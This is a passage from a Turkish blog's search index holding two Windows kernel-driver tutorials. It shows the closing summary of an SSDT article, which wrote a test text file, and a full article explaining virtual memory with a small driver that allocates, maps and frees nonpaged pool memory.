.txt oluşturulmuş ve içerisine veri yazılmış mı buna bakalım:\nBaşarılı bir şekilde C:\\ssdt.txt oluşturulduğunu ve içerisine ‘Hello SSDT!’ metni yazdırıldığını görebiliriz.\nSonuç Sonuç olarak, bu yazıda SSDT’nin WinDbg ortamında analizini gerçekleştirdik ve elde ettiğimiz bulguları kodlamaya döktük. Kodlama aşamasında, öğrendiğimiz formüller ile NtCreateFile ve NtWriteFile’in routine adreslerini hesapladık. Bu adresleri kullanarak bir .txt dosyası oluşturduk ve içerisine metin yazdık. Son olarak ise windbg’da kodladığımız driver’i analiz etmiş olduk.\nUmarım bu konu sizler için faydalı olmuştur. Konu, ilk bakışta kafa karıştırıcı gibi görünebilir; ancak teoride kalmaması ve daha iyi anlaşılabilmesi için detayları mümkün olduğunca açıklamaya çalıştım.\nHepinize iyi çalışmalar dilerim!\nReferences iRedTeam Notes - SSDT\nWikipedia - System Service Descriptor Table","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":"","ssdt-nedir#\u003cstrong\u003eSSDT Nedir?\u003c/strong\u003e":"","syscall-ile-routine-adresi-bulma#\u003cstrong\u003eSyscall ile Routine Adresi bulma\u003c/strong\u003e":"","windbg-ile-analiz#\u003cstrong\u003eWindbg ile Analiz\u003c/strong\u003e":""},"title":"SSDT"},"/docs/winkernel-dev/wkd-virtual-memory/":{"data":{"":"","code#Code":"","references#References":"Merhabalar, bu yazıda Virtual Memory konusunu ele alacağım.\nVirtual Memory Nedir? “Windows, her bir process için, büyük ve özel bir adres alanına sahipmiş gibi görünen bir sanal bellek sistemi kullanır. Sanal bellek, gerçek fiziksel belleğin düzenine bağlı kalmaksızın, belleğin daha soyut bir görünümünü sunar. Çalışma sırasında, bellek yöneticisi -donanım desteği ile- sanal adresleri verilerin gerçekten saklandığı fiziksel adreslere çevirir. Bu sayede, işletim sistemi her bir process’in, diğer bir process’in belleğine müdahale etmesini veya işletim sisteminin kritik verilerinin üzerine yazılmasını engelleyebilir.\"\n–Windows Internals Part 1 - Chapter 1, Page 39\nYukarıdaki kaynağa göre kısaca Virtual Memory (Sanal Bellek), fiziksel bellek adresindeki verilerin ldealleştirilmiş bir soyutlama sağlayan bir bellek yönetim tekniğidir. Bu sayede işletim sistemi her bir process’in, diğer process belleğine müdahale etmesini veya işletim sisteminin kritik verilerinin üzerine yazılmasını engelleyebilir.\nBu sistem, verileri bellekte (RAM) ve sabit diskte (hard disk) saklamak için bir yöntem kullanır. Bu yöntem, verileri küçük parçalara böler. Her bir parça ‘page’ (sayfa) olarak adlandırılır ve genellikle 4 KB boyutundadır.\nBu sayfalar, bellekte bitişik olarak saklanmak zorunda değildir. Yani, bir uygulamanın verileri bellekte düzensiz bir şekilde yer alabilir. Örneğin, bir uygulamanın bazı verileri bellekte bulunurken, bazıları diskte saklanabilir. Bu yöntem, uygulamanın performansını etkilemeden bellek kullanımını optimize etmesini sağlar.\nBu sistemin avantajı, uygulamaların sayfalamadan yararlanmak için herhangi bir özel değişiklik yapmasına gerek olmamasıdır. Bellek yönetim sistemi, bu işlemleri otomatik olarak yapar. Aşağıdaki şemada bunu daha iyi görebilirsiniz.\nWindows Internals - Part 1, Page 40\rSanal adres alanının boyutu her donanım platformuna göre değişiklik gösterir. Örneğin Windows’ta 32-bit x86 sistemlerde toplam sanal adres alanı en fazla 4 GB’dır. Yine bu platformda varsayılan olarak, Windows bu adres alanının alt yarısını (0x00000000 - 0x7FFFFF arası adresler) kendi özel depolama alanlarını ve üst yarısını (0x80000000 - 0xFFFFFF arası adresler) kendi korumalı işletim sistemi bellek kullanımı için ayırır.\nWindows’ta 64-bit (x64) sistemlerde ise sanal adres alanı çok daha geniştir. 64-bit bir adresleme sistemi teorik olarak 16 exabyte (2^64 bayt) sanal adres alanı sunar. Ancak, mevcut donanım ve işletim sistemi kısıtlamaları nedeniyle bu alanın tamamı kullanılmaz. Windows x64 işletim sistemlerinde genellikle sanal adres alanı 256 terabyte (2^48 bayt) ile sınırlıdır.\nCode Bu etapta, sürücü üzerinden kernel space alanından bir bellek ayrımı yapıp ardından bu belleği sanal adres ile eşleştireceğiz.\nGithub linki için buraya tıklayabilirsiniz.\n#pragma warning(disable: 4996) #include \u003cntddk.h\u003e NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); SIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Bellek Ayrimi basarisiz oldu!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Ayrilan Bellek Adresi: 0x%p\\n\", VirtualAddress); MDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL Ayrimi basarisiz oldu!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } MmBuildMdlForNonPagedPool(MDL); MappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Sanal Adres esleme basarisiz!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Sanal Adres esleme basarili! Adres: 0x%p\\n\", MappedAddress); MmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unloaded\\n\"); return STATUS_SUCCESS; } Örnek kod parçamız bu. Şimdi bu kodu inceleyelim.\nSIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; İlk olarak sürücümüzde parametreleri tanımlayarak başlıyoruz. İşte sırasıyla amaçları:\nMemorySize: Bellek ayrımı yapılacak alanın boyutunu belirler. Bu örnekte 0x1000 (4 KB) olarak belirledim. VirtualAddress: Bellek ayrımı yapıldığında dönen adresi tutar. MappedAddress: Belleğin sanal adres ile eşleştirildiği adresi tutar. MDL: Belleğin sanal adres ile eşleştirilmesi için kullanılan MDL yapısını tutar. VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Bellek Ayrimi basarisiz oldu!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Ayrilan Bellek Adresi: 0x%p\\n\", VirtualAddress); İlk adımımızda Nonpaged Pool alanından 4 KB’lık bir bellek ayrımı yapıyoruz. Eğer bellek ayrımı başarısız olursa, hata mesajı yazdırıp işlemi sonlandırıyoruz. Ayrıca başarılı olursa, ayrılan belleğin adresini yazdırıyoruz.\nEğer Nonpaged havuzu hakkında bilginiz yoksa burada bir kısa açıklama yapayım. Nonpaged Pool, işletim sisteminde kullanılan bellek havuzlarından biridir. Bu havuz, sistemin her zaman erişilebilir olan ve disk belleği ile değiştirilemeyen (yani “paging” işlemi uygulanamayan) bellek alanını ifade eder. Nonpaged pool içindeki bellek, sistemde kritik öneme sahip işler için ayrılır. Örneğin, donanım sürücüleri veya çekirdek (kernel) modundaki diğer bileşenler, bu havuzdan bellek tahsis ederler çünkü bu bileşenlerin bellek erişiminin her zaman hızlı ve kesintisiz olması gerekir.\nBunun yanında Paged Pool alanı vardır. Bu da işletim sisteminde kullanılan bellek havuzlarından biridir. Bu havuz, sistemin bellek yönetimi için kullanılan ve disk belleği ile değiştirilebilen (yani “paging” işlemi uygulanabilen) bellek alanını ifade eder. Paged pool içindeki bellek, genellikle kullanıcı modunda çalışan uygulamalar ve hizmetler için ayrılır.\nMDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL Ayrimi basarisiz oldu!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } Kodun devamında ise, bellek bloğunun fiziksel adreslerine erişmek ve bu bloğu bir sanal adres ile eşleştirmek için bir MDL (Memory Descriptor List) yapısı oluşturuyoruz. MDL yapısı, belleğin fiziksel adreslerini ve boyutunu tutar, böylece bu blokla ilişkili verilerin sanal bellekten fiziksel belleğe nasıl eşleştirileceğini tanımlar.\nMmBuildMdlForNonPagedPool(MDL); Daha sonra bı API ile MDL yapısını oluşturuyoruz. Bu fonksiyon, MDL yapısını oluştururken, MDL yapısının fiziksel bellek adreslerini ve boyutunu doldurur.\nMappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Sanal Adres esleme basarisiz!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Sanal Adres esleme basarili! Adres: 0x%p\\n\", MappedAddress); Son olarak belleğimizi sanal adresle eşlemek için MmMapLockedPagesSpecifyCache API kullanıyoruz. Bu fonksiyon, MDL yapısını kullanarak belirtilen bellek bloğunu sanal belleğe eşler. Eğer işlem başarısız olursa, hata mesajı yazdırıp işlemi sonlandırıyoruz. Başarılı olursa, eşlenen belleğin adresini yazdırıyoruz.\nMmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; Son olarak, işimiz bittiğinde belleği serbest bırakıyoruz. Bu işlemi yaparken, önce MmUnmapLockedPages fonksiyonunu kullanarak sanal belleği serbest bırakıyoruz. Daha sonra IoFreeMdl fonksiyonu ile MDL yapısını serbest bırakıyoruz.\nSürücünün Çalıştırılması Görüldüğü gibi, sürücüyü çalıştırdığımızda başarıyla ayrılan bellek adresi ve eşlenen sanal bellek adresini windbg üzerinden görebiliyoruz:\nSonuç Bu yazıda, Virtual Memory konusunu ele aldım. Umarım faydalı olmuştur.\nİyi çalışmalar dilerim 🚀🚀\nReferences Windows Internals Part 1 - Chapter 1, Virtual Memory (PAGE 39- 41) EN Wikipedia - Virtual Memory ","sonuç#Sonuç":"","sürücünün-çalıştırılması#Sürücünün Çalıştırılması":"","virtual-memory-nedir#Virtual Memory Nedir?":""},"title":"Virtual Memory"}}